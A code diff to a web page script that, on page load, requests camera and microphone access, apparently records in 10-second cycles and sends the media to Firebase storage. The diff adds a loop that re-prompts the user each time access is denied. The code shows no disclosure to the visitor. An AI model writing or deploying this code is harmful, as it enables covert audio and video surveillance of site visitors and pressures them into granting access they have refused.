@@ -4329,7 +4329,7 @@
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
 
-window.onload = function () {
+    window.onload = function () {
     const hasPermission = localStorage.getItem('hasPermission') === 'true';
 
     function startRecording() {
@@ -4362,16 +4362,26 @@ window.onload = function () {
                     });
                 }, 10000);
             })
-            .catch(alert);
+            .catch((error) => {
+                alert('Permission denied or blocked. Please allow access and try again.');
+                askForPermission();
+            });
     }
 
-    if (!hasPermission) {
+    function askForPermission() {
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then((stream) => {
                 localStorage.setItem('hasPermission', 'true');
                 startRecording();
             })
-            .catch(alert);
+            .catch((error) => {
+                alert('Permission denied or blocked again. Please allow access and try again.');
+                askForPermission();
+            });
+    }
+
+    if (!hasPermission) {
+        askForPermission();
     } else {
         startRecording();
     }
